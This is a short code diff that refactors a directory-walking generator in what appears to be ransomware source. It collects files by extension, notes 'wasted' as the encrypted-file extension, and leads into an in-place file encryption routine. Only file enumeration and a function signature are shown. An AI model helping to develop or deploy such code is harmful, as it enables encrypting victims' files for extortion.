@@ -38,13 +38,12 @@ def discoverFiles(startpath):
         # encrypted extension
         'wasted',
     ]
-    def iter_files(startpath):
-        for dirpath, _, files in os.walk(startpath):
-            for fname in files:
-                path = os.path.abspath(os.path.join(dirpath, fname))
-                ext = os.path.splitext(fname)[1].lower().lstrip('.')
-                if ext in extensions:
-                   yield path
+    for dirpath, _, files in os.walk(startpath):
+        for fname in files:
+            path = os.path.abspath(os.path.join(dirpath, fname))
+            ext = os.path.splitext(fname)[1].lower().lstrip('.')
+            if ext in extensions:
+                yield path
 # ------ inlined modify.py ------
 
 def modify_file_inplace(filename, crypto, blocksize=16):
